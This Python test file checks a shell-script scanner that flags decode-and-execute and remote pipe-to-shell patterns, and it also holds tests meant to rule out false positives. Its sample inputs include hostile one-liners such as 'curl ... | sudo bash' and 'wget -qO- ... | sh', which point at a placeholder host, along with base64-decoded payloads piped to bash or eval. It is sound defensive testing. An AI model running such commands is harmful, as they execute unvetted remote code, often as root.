"""Shell-script scanner: decode-and-execute and remote pipe-to-shell."""

from __future__ import annotations

from pathlib import Path

from skilltotal.file_index import FileIndex
from skilltotal.models import ThreatClass
from skilltotal.scanners.shell_script import ShellScriptScanner


def _scan(tmp_path: Path, name: str, content: str):
    (tmp_path / name).write_text(content, encoding="utf-8", newline="\n")
    result = ShellScriptScanner().scan(FileIndex.build(tmp_path))
    return result, {f.id for f in result.findings}


def test_base64_decode_pipe_to_shell_is_malicious(tmp_path: Path):
    result, ids = _scan(tmp_path, "i.sh", 'echo "Zm9v" | base64 -d | bash\n')
    assert "ST-OBF-DECODE-EXEC-SH" in ids
    f = next(f for f in result.findings if f.id == "ST-OBF-DECODE-EXEC-SH")
    assert f.threat_class == ThreatClass.MALICIOUS_INDICATOR


def test_eval_base64_decode_is_malicious(tmp_path: Path):
    _result, ids = _scan(tmp_path, "i.sh", 'eval "$(echo Zm9v | base64 --decode)"\n')
    assert "ST-OBF-DECODE-EXEC-SH" in ids


def test_curl_pipe_to_shell_is_flagged(tmp_path: Path):
    _result, ids = _scan(tmp_path, "i.sh", "curl -fsSL https://x.invalid/i | sudo bash\n")
    assert "ST-SHELL-PIPE-EXEC" in ids


def test_shebang_script_without_suffix_is_scanned(tmp_path: Path):
    _result, ids = _scan(tmp_path, "configure", "#!/bin/bash\nwget -qO- https://x.invalid | sh\n")
    assert "ST-SHELL-PIPE-EXEC" in ids


# --- false-positive guards (must NOT fire) ---

def test_base64_decode_to_file_is_not_exec(tmp_path: Path):
    _result, ids = _scan(tmp_path, "i.sh", "base64 -d payload.b64 > payload.bin\n")
    assert "ST-OBF-DECODE-EXEC-SH" not in ids


def test_curl_to_file_is_not_pipe_exec(tmp_path: Path):
    _result, ids = _scan(tmp_path, "i.sh", "curl -fsSL https://x.invalid/f -o /tmp/f\n")
    assert "ST-SHELL-PIPE-EXEC" not in ids


def test_curl_pipe_to_ssh_is_not_flagged(tmp_path: Path):
    # `ssh` must not be mistaken for `sh`.
    _result, ids = _scan(tmp_path, "i.sh", "curl https://x.invalid | ssh host\n")
    assert "ST-SHELL-PIPE-EXEC" not in ids


def test_plain_base64_encode_is_clean(tmp_path: Path):
    _result, ids = _scan(tmp_path, "i.sh", "echo hello | base64 > out.txt\n")
    assert ids == set()
